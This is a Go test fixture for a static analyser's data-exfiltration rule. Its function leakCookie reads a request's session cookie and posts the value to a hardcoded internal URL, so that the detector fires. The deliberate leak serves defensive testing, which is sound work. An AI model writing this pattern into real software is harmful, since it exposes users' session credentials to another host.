// DATA_EXFIL fixture: a fixed destination URL and a Sensitive (cookie)
// source flowing into the outbound body of `http.Post`.  SSRF must NOT
// fire (URL is hardcoded, position 0) but `Cap::DATA_EXFIL` must fire on
// the body (position 2) — the auth cookie is exactly the cross-boundary
// state DATA_EXFIL targets.
//
// Driven by `data_exfil_go_integration_tests.rs`.
package fixture

import (
	"net/http"
	"strings"
)

func leakCookie(r *http.Request) {
	c, _ := r.Cookie("session")
	body := strings.NewReader(c.Value)
	http.Post("https://analytics.internal/track", "text/plain", body)
}
